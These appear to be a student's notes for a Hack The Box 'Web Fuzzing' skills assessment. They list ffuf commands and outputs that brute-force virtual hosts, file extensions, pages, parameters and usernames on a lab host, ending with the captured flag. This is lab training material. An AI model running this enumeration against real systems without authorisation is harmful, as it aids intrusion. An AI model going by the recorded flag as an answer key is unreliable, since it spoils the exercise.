# Skills Assessment - Web Fuzzing

## Sub-domain / Vhost

sudo sh -c 'echo "83.136.253.251  academy.htb" >> /etc/hosts'

:50388

ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb:50388/ > fuzz-subdomain.txt

--> Failed

ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb/ > fuzz-subdomain.txt

--> Failed

ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:50388/ -H 'Host: FUZZ.academy.htb' > ffuf-vhost2.txt

ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:50388/ -H 'Host: FUZZ.academy.htb' -fs 985 > ffuf-vhost3.txt

test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]

## Extension

sudo sh -c 'echo "83.136.253.251  test.academy.htb" >> /etc/hosts'
sudo sh -c 'echo "83.136.253.251  archive.academy.htb" >> /etc/hosts'
sudo sh -c 'echo "83.136.253.251  faculty.academy.htb" >> /etc/hosts'


ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://test.academy.htb:50388/indexFUZZ
.php                    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 0ms]
.phps                   [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 0ms]

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://archive.academy.htb:50388/indexFUZZ
.php                    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 0ms]
.phps                   [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 0ms]

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:50388/indexFUZZ
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 2375ms]



ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://83.136.253.251:50388/indexFUZZ
.php                    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 0ms]
.phps                   [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 0ms]


83.136.253.251

## Pages

vi subdomains.txt
test
archive
faculty

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -w subdomains.txt:SUB -u http://SUB.academy.htb:50388/FUZZ -recursion -recursion-depth 1 -e .php -v > fuzz.txt

http://faculty.academy.htb:50388/courses/

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:50388/courses/FUZZ.php7 > courses.txt

linux-security          [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 0ms]

curl http://faculty.academy.htb:50388/courses/linux-security.php7 -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'

## Parameters

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:50388/courses/linux-security.php7?FUZZ=key

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:50388/courses/linux-security.php7?FUZZ=key -fs 774

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 0ms]


ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:50388/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:50388/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 0ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 0ms]

ffuf -w /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ -u http://faculty.academy.htb:50388/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' > fuzz-parameter-post.txt

--> Failed list too short

ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:50388/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' > fuzz-parameter-post.txt

ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:50388/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' > fuzz-parameter-post.txt -fs 781

harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 57ms]

curl http://faculty.academy.htb:50388/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'

<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>
